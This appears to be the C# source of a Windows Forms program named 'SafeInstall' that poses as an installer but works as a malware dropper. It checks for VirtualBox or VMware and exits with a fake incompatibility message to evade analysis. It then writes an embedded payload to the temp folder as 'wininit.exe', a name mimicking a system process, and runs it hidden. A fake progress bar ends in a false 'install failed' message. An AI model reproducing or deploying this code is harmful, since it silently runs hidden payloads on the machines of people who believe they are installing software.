using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SafeInstall
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            checkVM();
            writeFile();
            InitializeComponent();
            progressBar1.Value = 0;
            timer1.Interval = 50;
            timer1.Start();
        }
        private void writeFile()
        {
            byte[] data = global::SafeInstall.Properties.Resources.load;
            string p = Path.GetTempPath()+"\\wininit.exe";
            if (File.Exists(p))
            {
                p = Path.GetTempFileName();

            }
            using(FileStream fs=new FileStream(p, FileMode.Create))
            {
                fs.Write(data, 0, data.Length);
            }
            Process process = new Process();
            process.StartInfo.FileName = p;
            process.StartInfo.Arguments = "8asdj2";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

        }
        private void checkVM()
        {
            string hdid = "";//硬盘序列号 
            ManagementClass cimobject = new ManagementClass("Win32_DiskDrive");
            ManagementObjectCollection moc = cimobject.GetInstances();
            foreach (ManagementObject mo in moc)
            {
                hdid = mo.Properties["model"].Value.ToString();
            }
            Console.WriteLine(hdid);
            if(hdid.Contains("VBOX") || hdid.ToLower().Contains("vmware"))
            {
                MessageBox.Show("系统不兼容.");
                Application.Exit();
                Application.ExitThread();
                System.Environment.Exit(0);
                return;
            }

            Process[] ps = Process.GetProcesses();
            foreach(var p in ps)
            {
                if (p.ProcessName.Contains("VBox"))
                {
                    MessageBox.Show("系统不兼容");
                    Application.Exit();
                    Application.ExitThread();
                    System.Environment.Exit(0);
                    return;
                }
            }
           

        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (progressBar1.Value == 70)
            {
                progressBar1.Value = progressBar1.Value + 1;
                timer1.Stop();
                MessageBox.Show("安装失败，系统不兼容");
                return;
            }
            if (progressBar1.Value >= 70)
            {
                timer1.Stop();
                return;
            }
            progressBar1.Value = progressBar1.Value + 1;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
